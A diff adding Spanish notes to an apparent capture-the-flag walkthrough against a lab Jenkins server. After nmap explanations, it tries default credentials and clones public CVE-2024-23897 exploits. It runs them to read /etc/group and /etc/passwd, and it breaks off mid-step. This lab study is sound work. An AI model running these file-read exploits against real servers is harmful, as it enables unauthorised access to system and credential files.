@@ -82,3 +82,36 @@ nmap --script http-enum -p8080 10.10.11.10 -oN webScan
 - `-oN`: Esta es una opción de Nmap que se utiliza para especificar el formato y el nombre del archivo de salida del escaneo.
     
 - `webScan`: Este es el nombre del archivo de salida donde se guardarán los resultados del escaneo. En este caso, el archivo se llamará "webScan".
+
+- A continuación podemos empezar a investigar la pagina web montada en el puerto 8080
+- Vemos que es una pagina de **Jenkins** y podemos buscar en el navegador **default password** como **admin/password**
+- Podemos observar la versión de **Jenkins** en la parte inferior y con esto podemos averiguar en internet un exploit en caso de que este desactualizado 
+- Analizamos la pagina y encontramos que tiene información de usuarios pero no da mas información, así que nos dirigimos a nuestra carpeta de scripts
+- Nos clonamos el repositorio de CVE-2024-23897
+```
+git clone https://github.com/h4x0r-dz/CVE-2024-23897.git
+```
+- Si realizamos un cat al archivo **CVE-2024-23897.py** podemos analizar un poco del script a utilizar 
+
+- Utilizamos la siguiente linea para observar información en ciertas rutas
+```
+python3 CVE-2024-23897.py -u http://10.10.11.10:8080 -f /etc/group
+```
+- En ocasiones toca volver a enviar la petición para que muestre otros resultados
+
+- Tambien tenemos otro exploit que nos trae de local el recurso
+```
+git clone https://github.com/CKevens/CVE-2024-23897.git
+```
+- Con este comando podemos enlistar mas información
+```
+java -jar jenkins-cli.jar -s https://www.10.10.11.10:8080 @/etc/passwd
+```
+
+- Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
+```
+burpsuite &> /dev/null & disown
+```
+- En las configuraciones del proxy editamos en la ip el host de la pagina que vamos a utilizar con el puerto designado
+
+- Nos clonamos 
